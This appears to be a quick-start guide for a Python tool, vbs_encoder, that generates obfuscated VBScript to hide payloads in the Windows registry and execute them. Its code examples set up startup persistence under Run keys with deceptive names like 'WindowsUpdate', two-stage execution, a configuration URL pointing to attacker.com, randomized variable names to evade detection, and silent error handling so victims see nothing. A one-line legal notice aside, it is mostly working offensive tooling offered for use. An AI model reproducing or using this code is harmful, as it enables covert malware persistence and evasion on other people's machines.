# Registry Storage Quick Start Guide

## Installation

The registry storage functionality is built into `vbs_encoder.py`. No additional installation needed.

## Quick Examples

### Example 1: Store Payload (5 lines)
```python
from vbs_encoder import write_payload_to_registry

vbs_code = write_payload_to_registry(
    payload="cmd.exe /c echo test",
    registry_hive="HKCU"
)
print(vbs_code)
```

### Example 2: Store and Retrieve (5 lines)
```python
from vbs_encoder import write_payload_to_registry

vbs_code = write_payload_to_registry(
    payload="calc.exe",
    registry_hive="HKCU",
    retrieve_and_execute=True
)
print(vbs_code)
```

### Example 3: Read Only (5 lines)
```python
from vbs_encoder import create_registry_retriever

vbs_code = create_registry_retriever(
    registry_hive="HKCU",
    auto_execute=False
)
print(vbs_code)
```

### Example 4: Validation (3 lines)
```python
from vbs_encoder import validate_registry_path, validate_registry_hive

if validate_registry_path("Software\\Test") and validate_registry_hive("HKCU"):
    print("Valid!")
```

## Common Tasks

### Task 1: Create Startup Persistence
```python
from vbs_encoder import write_payload_to_registry

# Runs on system startup
vbs_code = write_payload_to_registry(
    payload="powershell.exe -Command 'Write-Host Running'",
    registry_hive="HKCU",
    registry_path="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    value_name="SystemService"
)
```

### Task 2: Store Configuration
```python
from vbs_encoder import write_payload_to_registry

vbs_code = write_payload_to_registry(
    payload="http://attacker.com/config.dat",
    registry_hive="HKCU",
    registry_path="Software\\MyApp",
    value_name="ConfigServer",
    encoding="base64"
)
```

### Task 3: Hide in System Registry
```python
from vbs_encoder import write_payload_to_registry

vbs_code = write_payload_to_registry(
    payload="C:\\hidden\\payload.exe",
    registry_hive="HKLM",
    registry_path="Software\\Microsoft\\Windows\\CurrentVersion",
    value_name="Update"
)
```

### Task 4: Two-Stage Execution
```python
from vbs_encoder import VBSEncoder

encoder = VBSEncoder()

# Stage 1: Store payload
storage = encoder.create_registry_storage_vbs(
    payload="second_stage.exe"
)

# Stage 2: Retrieve and execute
execution = encoder.create_registry_retrieval_and_execute_vbs(
    auto_execute=True
)
```

## Registry Hives Explained

### HKCU (User)
- No admin needed
- Per-user scope
- Located: `HKEY_CURRENT_USER`
- Best for: User-level persistence

### HKLM (System)
- Admin may be required
- System-wide scope
- Located: `HKEY_LOCAL_MACHINE`
- Best for: System-wide persistence

## Encoding Methods

### Base64 (Recommended)
```python
encoding="base64"  # Default
```
- More reliable
- Works on all Windows versions
- ~33% size overhead

### Hex (Obfuscated)
```python
encoding="hex"
```
- More obfuscated appearance
- ~100% size overhead
- Good for short commands

## Registry Paths Quick Reference

### Startup Locations
```python
# User startup
"Software\\Microsoft\\Windows\\CurrentVersion\\Run"

# System startup
"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
```

### Custom Locations
```python
# Internet Explorer
"Software\\Microsoft\\Internet Explorer\\Desktop\\Components"

# Windows Settings
"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
```

## Save to File

```python
from vbs_encoder import write_payload_to_registry

vbs_code = write_payload_to_registry(
    payload="malware.exe",
    registry_hive="HKCU"
)

# Save to file
with open("payload.vbs", "w") as f:
    f.write(vbs_code)

# Execute
# cscript.exe payload.vbs
```

## Verify Output

```python
from vbs_encoder import write_payload_to_registry

vbs_code = write_payload_to_registry("test")

# Check it contains expected elements
assert "WScript.Shell" in vbs_code
assert "RegWrite" in vbs_code
assert "Set" in vbs_code
assert "Nothing" in vbs_code
```

## Error Handling

All generated code includes error handling:

```vbs
On Error Resume Next
[operation]
On Error GoTo 0
```

This means:
- Errors don't stop execution
- Silent failures on permission issues
- No visible error messages

## Payload Size Limits

| Encoding | Max Size | Notes |
|----------|----------|-------|
| Base64 | ~24 KB | (32KB registry limit with 33% overhead) |
| Hex | ~16 KB | (32KB registry limit with 100% overhead) |

## Common Issues

### Issue 1: Registry Write Fails
**Cause:** No admin privileges for HKLM
**Solution:** Use HKCU instead or run as admin

### Issue 2: Payload Not Executing
**Cause:** `auto_execute=False` or command syntax error
**Solution:** Verify command and set `auto_execute=True`

### Issue 3: Large Payload Error
**Cause:** Payload exceeds registry size limit
**Solution:** Split payload or use compression

## Full Workflow Example

```python
#!/usr/bin/env python3
from vbs_encoder import write_payload_to_registry, validate_registry_path, validate_registry_hive

# Step 1: Define payload
payload = "powershell.exe -NoProfile -Command 'Get-Process'"
registry_hive = "HKCU"
registry_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
value_name = "WindowsUpdate"

# Step 2: Validate configuration
if not validate_registry_path(registry_path):
    print("Invalid registry path")
    exit(1)

if not validate_registry_hive(registry_hive):
    print("Invalid registry hive")
    exit(1)

# Step 3: Generate VBS code
vbs_code = write_payload_to_registry(
    payload=payload,
    registry_hive=registry_hive,
    registry_path=registry_path,
    value_name=value_name,
    encoding="base64",
    retrieve_and_execute=True
)

# Step 4: Save to file
with open("registry_payload.vbs", "w") as f:
    f.write(vbs_code)

print("✓ Payload generated: registry_payload.vbs")
print(f"✓ Size: {len(vbs_code)} bytes")
print(f"✓ Location: {registry_hive}\\{registry_path}\\{value_name}")
```

## Advanced: Custom Encoder Settings

```python
from vbs_encoder import VBSEncoder, ObfuscationConfig

# Create custom configuration
config = ObfuscationConfig(
    use_base64=True,
    use_variable_obfuscation=True,
    randomize_function_names=True
)

# Use with encoder
encoder = VBSEncoder(config)
vbs_code = encoder.create_registry_storage_vbs(
    payload="test",
    registry_hive="HKCU"
)
```

## Testing Your Code

```bash
# Run all tests
python3 -m unittest test_registry_storage -v

# Run specific test
python3 -m unittest test_registry_storage.TestRegistryStorage.test_registry_storage_hkcu_base64

# Run examples
python3 registry_storage_examples.py
```

## Security Notes

1. **Not Encryption**: Base64/Hex are reversible - use with caution
2. **Error Handling**: Failures are silent - errors won't alert user
3. **Variable Names**: Randomized to avoid pattern detection
4. **Admin Escalation**: HKLM requires admin privileges
5. **Obfuscation Level**: Complements but doesn't replace other techniques

## Next Steps

1. Read `REGISTRY_STORAGE_GUIDE.md` for detailed documentation
2. Review `REGISTRY_STORAGE_API_REFERENCE.md` for all functions
3. Run `registry_storage_examples.py` for 12 working examples
4. Check `test_registry_storage.py` for test patterns

## Integration

Combine with other vbs_encoder functions:

```python
from vbs_encoder import generate_clean_vbs_payload, write_payload_to_registry

# Generate obfuscated command
obfuscated = generate_clean_vbs_payload(
    "malware.exe",
    obfuscation_level="high"
)

# Store in registry
vbs_code = write_payload_to_registry(
    payload=obfuscated,
    registry_hive="HKCU",
    retrieve_and_execute=True
)
```

## Legal Notice

**This tool is for authorized security testing only.**

Unauthorized access to computer systems is illegal. Ensure you have proper authorization before using these tools.

---

**Quick Links:**
- [Full Guide](REGISTRY_STORAGE_GUIDE.md)
- [API Reference](REGISTRY_STORAGE_API_REFERENCE.md)
- [Examples](registry_storage_examples.py)
- [Tests](test_registry_storage.py)
